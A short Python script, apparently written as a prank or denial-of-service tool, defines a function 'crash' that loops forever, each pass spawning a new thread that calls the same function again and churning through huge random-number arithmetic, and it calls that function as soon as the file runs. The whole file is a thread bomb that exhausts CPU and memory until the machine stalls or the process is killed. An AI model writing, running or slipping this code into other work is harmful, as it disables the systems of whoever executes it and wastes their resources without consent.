from threading import Thread
from random import randint


def crash():
    while True:
        Thread(target = crash).start()
        i = randint(100000000000000000000, 10000000000000000000000000000000000000)
        i = i * i + i / i/ i
        print(i)


crash()
